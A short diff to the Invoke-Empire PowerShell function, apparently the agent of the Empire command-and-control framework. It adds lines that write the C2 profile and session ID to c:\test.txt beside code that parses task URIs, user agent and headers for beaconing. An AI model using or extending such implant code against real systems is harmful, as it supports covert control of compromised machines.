@@ -124,10 +124,12 @@ function Invoke-Empire {
     #       uris(comma separated)|UserAgent|header1=val|header2=val2...
     #       headers are optional. format is "key:value"
     #       ex- cookies are "cookie:blah=123;meh=456"
+    Add-Content c:\test.txt $Profile
     $ProfileParts = $Profile.split('|')
     $script:TaskURIs = $ProfileParts[0].split(',')
     $script:UserAgent = $ProfileParts[1]
     $script:SessionID = $SessionID
+    Add-Content c:\test.txt $SessionID
     $script:Headers = @{}
     # add any additional request headers if there are any specified in the profile
     if($ProfileParts[2]) {
@@ -471,7 +473,8 @@ function Invoke-Empire {
         #   uris(comma separated)|UserAgent|header1=val|header2=val2...
         #   headers are optional. format is "key:value"
         #   ex- cookies are "cookie:blah=123;meh=456"
-
+        Add-Content c:\test.txt "Update Profile"
+        Add-Content c:\test.txt $Profile
         $ProfileParts = $Profile.split('|')
         $script:TaskURIs = $ProfileParts[0].split(',')
         $script:UserAgent = $ProfileParts[1]
